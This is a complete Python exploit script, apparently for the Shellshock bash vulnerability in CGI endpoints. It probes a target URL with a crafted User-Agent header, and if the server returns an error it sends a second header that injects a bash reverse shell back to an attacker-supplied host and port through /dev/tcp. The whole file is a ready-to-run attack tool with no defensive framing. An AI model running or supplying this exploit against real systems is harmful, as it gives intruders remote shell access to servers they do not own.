import requests
import argparse
import sys

parser = argparse.ArgumentParser(usage=f"python3 {sys.argv[0]} -u <url> -lh <lhost> -lp <lport>")

parser.add_argument("-u","--url",metavar='',required=True,help="Vulnerable url - E.g: http://10.10.10.10/cgi-bin/filename.sh")
parser.add_argument("-lh","--lhost",metavar='',required=True,help="Ip of the listening host")
parser.add_argument("-lp","--lport",metavar='',required=False,help="Number of the listening port, default 4444")

args = parser.parse_args()

url=args.url
lhost=args.lhost
lport=4444

if args.lport:
    lport=args.lport

print("[?] Checking target")

check = requests.get(url,headers={'User-Agent':"() { :;};''"})

if check.status_code != 500:
    print("[-] Target doesn't seem vulnerable, exiting...")
    exit(0)

print("[!]Target seems vulnerable")
print(f"[!]Sending reverse shell to {lhost} port {lport}")

requests.get(url,headers={'User-Agent':"() { :;}; /bin/bash -i >& /dev/tcp/"+f"{lhost}/{lport} 0>&1 "})